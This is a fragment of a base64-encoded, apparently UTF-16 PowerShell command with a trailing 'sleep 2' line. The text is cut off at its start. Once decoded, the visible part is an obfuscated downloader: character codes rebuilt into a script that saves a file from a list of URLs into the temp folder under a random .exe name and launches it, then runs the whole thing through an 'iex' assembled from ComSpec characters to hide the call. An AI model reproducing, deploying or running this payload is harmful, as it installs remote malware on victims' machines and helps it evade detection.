xACwAIAA1ADkALAAgADMANgAsACAAMQAxADAALAAgADkANwAsACAAMQAwADkAIAAsACAAMQAwADEAIAAsADMAMgAgACwANgAxACwAMwAyACwAIAAzADYALAAgADEAMQA0ACwAOQA3ACAALAAxADEAMAAgACwAIAAxADAAMAAgACwAIAAxADEAMQAsADEAMAA5ACwANAA2ACwAIAAxADEAMAAsADEAMAAxACAALAAxADIAMAAgACwAIAAxADEANgAgACwANAAwACAALAAgADQAOQAsADQANAAsACAAMwAyACAALAA1ADQALAAgADUAMwAgACwANQAzACAALAAgADUAMQAgACwANQA0ACwAIAA0ADEALAA1ADkALAAgADMANgAsADEAMQAyACwAOQA3ACAALAAxADEANgAsACAAMQAwADQAIAAsACAAMwAyACwAIAA2ADEAIAAsADMAMgAgACwAIAAzADYALAAxADAAMQAsACAAMQAxADAALAAgADEAMQA4ACAALAAgADUAOAAsADEAMQA2ACwAMQAwADEAIAAsACAAMQAwADkAIAAsADEAMQAyACAALAAzADIALAA0ADMAIAAsADMAMgAsACAAMwA5ACAALAA5ADIAIAAsACAAMwA5ACwAMwAyACwAIAA0ADMAIAAsADMAMgAgACwAIAAzADYAIAAsACAAMQAxADAAIAAsADkANwAsACAAMQAwADkAIAAsADEAMAAxACwAMwAyACAALAA0ADMAIAAsADMAMgAsADMAOQAgACwANAA2ACAALAAgADEAMAAxACwAMQAyADAAIAAsACAAMQAwADEALAAzADkALAAgADUAOQAgACwAIAAxADAAMgAsADEAMQAxACwAMQAxADQALAAxADAAMQAsACAAOQA3ACwAOQA5ACAALAAxADAANAAsADQAMAAsADMANgAsACAAMQAxADcAIAAsADEAMQA0ACwAIAAxADAAOAAsACAAMwAyACwAIAAxADAANQAsADEAMQAwACwAMwAyACwAIAAzADYAIAAsADEAMQA3ACwAIAAxADEANAAgACwAIAAxADAAOAAgACwAIAAxADEANQAgACwAIAA0ADEAIAAsACAAMQAyADMALAAxADEANgAsACAAMQAxADQALAAgADEAMgAxACwAMQAyADMAIAAsACAAMwA2ACAALAAxADEAOQAgACwAIAAxADAAMQAgACwAOQA4ACwAOQA5ACAALAAxADAAOAAsACAAMQAwADUAIAAsACAAMQAwADEAIAAsACAAMQAxADAAIAAsACAAMQAxADYAIAAsADQANgAsACAANgA4ACwAIAAxADEAMQAsACAAMQAxADkAIAAsADEAMQAwACwAMQAwADgAIAAsADEAMQAxACwAOQA3ACAALAAxADAAMAAsADcAMAAsADEAMAA1ACAALAAgADEAMAA4ACAALAAxADAAMQAgACwAIAA0ADAAIAAsADMANgAsACAAMQAxADcALAAgADEAMQA0ACAALAAgADEAMAA4ACAALAAgADQANgAsACAAOAA0ACAALAAxADEAMQAgACwAIAA4ADMAIAAsACAAMQAxADYALAAgADEAMQA0ACwAIAAxADAANQAsADEAMQAwACwAIAAxADAAMwAsADQAMAAsACAANAAxACwANAA0ACwAMwAyACAALAAzADYAIAAsADEAMQAyACAALAAgADkANwAgACwAIAAxADEANgAsADEAMAA0ACAALAAgADQAMQAsADUAOQAgACwAOAAzACwAMQAxADYALAA5ADcALAAxADEANAAsADEAMQA2ACwANAA1ACAALAAgADgAMAAgACwAIAAxADEANAAgACwAIAAxADEAMQAgACwAIAA5ADkAIAAsACAAMQAwADEALAAgADEAMQA1ACAALAAxADEANQAgACwAMwAyACAALAAzADYAIAAsACAAMQAxADIALAA5ADcALAAgADEAMQA2ACwAMQAwADQALAA1ADkAIAAsADkAOAAgACwAIAAxADEANAAsADEAMAAxACwAIAA5ADcALAAgADEAMAA3ACAALAAgADUAOQAsACAAMQAyADUALAAgADkAOQAsADkANwAgACwAIAAxADEANgAgACwAIAA5ADkALAAgADEAMAA0ACwAIAAxADIAMwAgACwAIAAxADEAOQAsACAAMQAxADQAIAAsACAAMQAwADUAIAAsADEAMQA2ACAALAAgADEAMAAxACwANAA1ACAALAAgADEAMAA0ACAALAAgADEAMQAxACAALAAxADEANQAsACAAMQAxADYALAAgADMAMgAgACwAIAAzADYAIAAsADkANQAsADQANgAgACwAIAA2ADkAIAAsADEAMgAwACwAIAA5ADkAIAAsACAAMQAwADEALAAxADEAMgAgACwAMQAxADYALAAxADAANQAgACwAMQAxADEAIAAsADEAMQAwACwANAA2ACwAIAA3ADcALAAgADEAMAAxACAALAAgADEAMQA1ACAALAAgADEAMQA1ACAALAAgADkANwAgACwAMQAwADMALAAxADAAMQAsACAANQA5ACwAIAAxADIANQAsACAAMQAyADUAKQAgAHwAIABmAG8AUgBFAEEAYwBIACAAewAgACgAWwBJAG4AdABdACAAJABfAC0AQQBzAFsAYwBoAGEAcgBdACkAfQApACsAIgAgACQAKABzAGUAdAAtAEkAdABlAG0AIAAgACcAVgBhAFIASQBBAEIATABlADoATwBGAHMAJwAgACcAIAAnACAAKQAiAHwAJgAgACgAIAAkAEUATgBWADoAQwBvAE0AUwBwAGUAYwBbADQALAAyADYALAAyADUAXQAtAEoAbwBJAE4AJwAnACkADQAKAA==
#Sleep
sleep 2
